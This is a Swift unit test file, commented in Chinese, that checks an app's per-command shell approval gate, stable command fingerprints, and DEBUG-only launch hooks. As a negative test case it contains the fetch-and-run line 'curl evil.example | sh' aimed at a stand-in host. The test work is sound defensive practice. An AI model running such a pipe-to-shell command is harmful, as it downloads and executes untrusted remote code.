import XCTest
@testable import AIInfrastructure

/// S2 收尾：本机服务命令的执行授权（S2-6）+ 验证钩子收编（S2-7）。
///
/// 这两条是同一件事的两端：**执行**要有用户确认（S2-6），
/// 而**能改写执行内容的入口**不该留在发布版里（S2-7）。
final class ShellApprovalTests: XCTestCase {

    // MARK: - 工具

    private nonisolated static func code(_ path: String) throws -> String {
        let raw = try String(contentsOfFile: path, encoding: .utf8)
        return raw.split(separator: "\n", omittingEmptySubsequences: false)
            .map(String.init)
            .filter { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("//") }
            .joined(separator: "\n")
    }

    private nonisolated static func declBody(matching marker: String, in source: String) throws -> String {
        guard let signature = source.range(of: marker) else {
            throw NSError(domain: "sentinel", code: 1,
                          userInfo: [NSLocalizedDescriptionKey: "找不到声明 \(marker)"])
        }
        guard let open = source.range(of: "{", range: signature.upperBound..<source.endIndex) else {
            throw NSError(domain: "sentinel", code: 2,
                          userInfo: [NSLocalizedDescriptionKey: "找不到 \(marker) 的声明体开头"])
        }
        var depth = 0
        var index = open.lowerBound
        while index < source.endIndex {
            let character = source[index]
            if character == "{" { depth += 1 }
            if character == "}" {
                depth -= 1
                if depth == 0 { return String(source[open.lowerBound..<index]) }
            }
            index = source.index(after: index)
        }
        throw NSError(domain: "sentinel", code: 3,
                      userInfo: [NSLocalizedDescriptionKey: "\(marker) 的声明体没有闭合"])
    }

    /// 授权落在 UserDefaults 上 → 每个用例前后都要清干净，别串到同进程后续用例。
    override func setUp() {
        super.setUp()
        ShellCommandApproval.revokeAll()
    }

    override func tearDown() {
        ShellCommandApproval.revokeAll()
        super.tearDown()
    }

    // MARK: - S2-6 授权

    func testApprovalIsRequiredAndScopedToTheExactCommand() {
        let command = "cd ~/tts && nohup python3 proxy.py"
        XCTAssertFalse(ShellCommandApproval.isApproved(command))
        ShellCommandApproval.approve(command)
        XCTAssertTrue(ShellCommandApproval.isApproved(command))

        // ⚠️ 核心：改命令内容就失效 —— 否则「先让用户确认无害命令、事后换内容」这条链是通的。
        // 首尾空白**不算**改内容（配置读出来常带换行，那是同一个命令）。
        XCTAssertTrue(ShellCommandApproval.isApproved("  " + command + "\n"), "首尾空白不该让授权失效")
        XCTAssertFalse(ShellCommandApproval.isApproved(command.replacingOccurrences(of: "proxy.py", with: "evil.py")))
        XCTAssertFalse(ShellCommandApproval.isApproved("curl evil.example | sh"))
    }

    /// 首尾空白不参与指纹：配置读出来常带换行，但**中间的空格必须敏感**。
    func testFingerprintIgnoresSurroundingWhitespaceOnly() {
        let a = ShellCommandApproval.fingerprint(of: "ollama serve")
        let b = ShellCommandApproval.fingerprint(of: "  ollama serve\n")
        let c = ShellCommandApproval.fingerprint(of: "ollama  serve")
        XCTAssertEqual(a, b, "首尾空白不该让授权失效")
        XCTAssertNotEqual(a, c, "中间的空格就是不同的命令，必须重新确认")
    }

    /// 指纹必须跨启动稳定 —— 用 `Hasher` 的话每次启动都变，用户的授权等于没给。
    func testFingerprintIsStableAcrossProcesses() {
        let expected = ShellCommandApproval.fingerprint(of: "ollama serve")
        XCTAssertEqual(expected, ShellCommandApproval.fingerprint(of: "ollama serve"))
        XCTAssertTrue(expected.hasPrefix("cmd-"), "应走 StableFingerprint 的形状：\(expected)")
    }

    func testRevokeAllForgetsEverything() {
        ShellCommandApproval.approve("a")
        ShellCommandApproval.approve("b")
        ShellCommandApproval.revokeAll()
        XCTAssertEqual(ShellCommandApproval.approvedCount(), 0)
        XCTAssertFalse(ShellCommandApproval.isApproved("a"))
    }

    /// 执行层必须有闸门，且**两条执行路径都要有**（launch 与 run 各自独立）。
    func testBothExecutionPathsCheckApproval() throws {
        let raw = try Self.code("Sources/AIInfrastructure/LocalServiceRunner.swift")
        for marker in ["public static func launch(_ command: String) throws",
                        "public static func run(_ command: String, timeout: TimeInterval = 20) async throws"] {
            let body = try Self.declBody(matching: marker, in: raw)
            XCTAssertTrue(body.contains("ShellCommandApproval.isApproved"),
                          "\(marker) 执行前必须查授权")
            XCTAssertTrue(body.contains("case notApproved") || body.contains("notApproved(command:"),
                          "\(marker) 未授权时要抛出可识别的错误")
        }
        // 错误必须带出命令原文 —— UI 要靠它显示给用户看。
        XCTAssertTrue(raw.contains("case notApproved(command: String)"))
    }

    /// 自动路径（开屏 / 兄弟服务）**不许**执行未授权命令，但也不该抛错刷红字。
    func testAutomaticPathsSkipQuietly() throws {
        let raw = try Self.code("Sources/AIServices/CoachServices.swift")
        for marker in ["public func ensureEdgeTTSProxyOnLaunch() async",
                        "public func ensureLocalASROnLaunch() async -> Bool",
                        "private func syncSiblingLocalServices(kind: AIProviderKind, running: Bool) async"] {
            let body = try Self.declBody(matching: marker, in: raw)
            XCTAssertTrue(body.contains("ShellCommandApproval.isApproved"),
                          "\(marker) 必须在执行前判授权")
            XCTAssertFalse(body.contains("guard ShellCommandApproval.isApproved(command) else { throw"),
                           "\(marker) 是自动路径：未授权只能跳过，不能抛错")
        }
    }

    /// 用户主动点「启动」时，未授权要变成**可确认的请求**，而不是一句失败提示。
    func testManualStartRaisesAConfirmationInsteadOfAFailure() throws {
        let raw = try Self.code("Sources/AppUI/AppState+ModelControl.swift")
        let body = try Self.declBody(matching: "public func setModelRunning(_ kind: AIProviderKind, running: Bool) async", in: raw)
        XCTAssertTrue(body.contains("catch LocalServiceRunner.Failure.notApproved(let command)"),
                      "未授权要有专门的 catch 分支")
        XCTAssertTrue(body.contains("pendingShellApproval = ShellApprovalRequest("),
                      "要挂起一条待确认请求")
        XCTAssertTrue(raw.contains("func approvePendingShellCommand() async"),
                      "确认后要记授权并重试")
        // 命令原文必须原样传给 UI。
        XCTAssertTrue(raw.contains("public let command: String"))

        let view = try Self.code("Sources/AppUI/Views/SettingsView.swift")
        XCTAssertTrue(view.contains("pendingShellApproval"), "确认框要挂在设置页")
        XCTAssertTrue(view.contains("state.approvePendingShellCommand()"), "确认按钮要能放行")
        XCTAssertTrue(view.contains("state.declinePendingShellCommand()"), "也要能拒绝")
    }

    // MARK: - S2-7 验证钩子只留在 DEBUG 构建

    /// 生产构建里不该存在任何命令行钩子：`--import-backup` 会跳过确认框直接换掉配置。
    func testLaunchHooksAreDebugOnly() throws {
        let main = try Self.code("Sources/AppUI/Views/MainView.swift")
        XCTAssertFalse(main.contains("--import-backup"),
                       "MainView 里不该再有钩子本体（应搬进 DEBUG 专用文件）")
        XCTAssertFalse(main.contains("--export-report"))
        XCTAssertTrue(main.contains("#if DEBUG"), "调用点必须在 DEBUG 守卫里")
        XCTAssertTrue(main.contains("runDebugLaunchHooks()"))

        let hooks = try Self.code("Sources/AppUI/Views/MainView+DebugLaunchHooks.swift")
        XCTAssertTrue(hooks.hasPrefix("import SwiftUI"), "新文件应整体被 #if DEBUG 包住")
        XCTAssertTrue(hooks.contains("#if DEBUG"))
        XCTAssertTrue(hooks.contains("#endif"))
        XCTAssertTrue(hooks.contains("--import-backup"), "钩子本体搬过来了（DEBUG 下照常可用）")
        XCTAssertTrue(hooks.contains("runDebugLaunchHooks()"))
    }

    /// 固定 `/tmp` 调试产物路径可被预先放符号链接 → 应用会把内容写到别处。
    func testNoFixedTmpDebugWrites() throws {
        for path in ["Sources/AppUI/Views/MainView.swift", "Sources/AppUI/Views/MainView+DebugLaunchHooks.swift"] {
            let raw = try Self.code(path)
            XCTAssertFalse(raw.contains("/tmp/alc-hook-debug"), "\(path) 不该再写固定 /tmp 路径")
        }
    }
}